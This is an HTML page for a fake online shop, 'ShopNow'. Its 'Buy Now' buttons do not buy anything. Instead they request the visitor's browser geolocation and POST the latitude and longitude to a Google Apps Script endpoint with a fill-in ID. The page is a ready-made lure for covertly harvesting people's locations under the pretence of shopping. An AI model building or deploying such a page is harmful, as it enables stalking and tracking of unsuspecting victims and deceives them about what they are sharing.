<!DOCTYPE html>
<html>
<head>
    <title>ShopNow - Great Deals Await!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }
        header {
            background-color: #333;
            color: #fff;
            padding: 10px 20px;
            text-align: center;
        }
        header h1 {
            margin: 0;
        }
        .container {
            padding: 20px;
        }
        .product-card {
            background: #fff;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin-bottom: 20px;
            text-align: center;
        }
        .product-card img {
            max-width: 100%;
            border-radius: 8px;
        }
        .product-card h3 {
            margin: 10px 0;
            color: #333;
        }
        .product-card p {
            color: #777;
        }
        .product-card button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
        }
        .product-card button:hover {
            background-color: #0056b3;
        }
        footer {
            text-align: center;
            padding: 10px;
            background-color: #333;
            color: #fff;
            position: fixed;
            bottom: 0;
            width: 100%;
        }
    </style>
</head>
<body>
    <header>
        <h1>ShopNow</h1>
        <p>Exclusive Deals Just for You!</p>
    </header>
    <div class="container">
        <div class="product-card">
            <img src="https://via.placeholder.com/300x200" alt="Product Image">
            <h3>Exclusive Item #1</h3>
            <p>Only $29.99! Grab it before it's gone.</p>
            <button onclick="getLocation()">Buy Now</button>
        </div>
        <div class="product-card">
            <img src="https://via.placeholder.com/300x200" alt="Product Image">
            <h3>Exclusive Item #2</h3>
            <p>Special Price: $19.99!</p>
            <button onclick="getLocation()">Buy Now</button>
        </div>
    </div>
    <footer>
        <p>ShopNow Â© 2025 - All Rights Reserved</p>
    </footer>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                alert("Geolocation is not supported by your browser.");
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            alert(`Your location is being processed! Latitude: ${lat}, Longitude: ${lon}`);

            // Replace with your backend endpoint
            fetch('https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ latitude: lat, longitude: lon }),
            })
            .then(response => response.text())
            .then(data => console.log('Success:', data))
            .catch(error => console.error('Error:', error));
        }

        function showError(error) {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    alert("You denied the request for location sharing.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("Location information is unavailable.");
                    break;
                case error.TIMEOUT:
                    alert("The request to get your location timed out.");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("An unknown error occurred.");
                    break;
            }
        }
    </script>
</body>
</html>
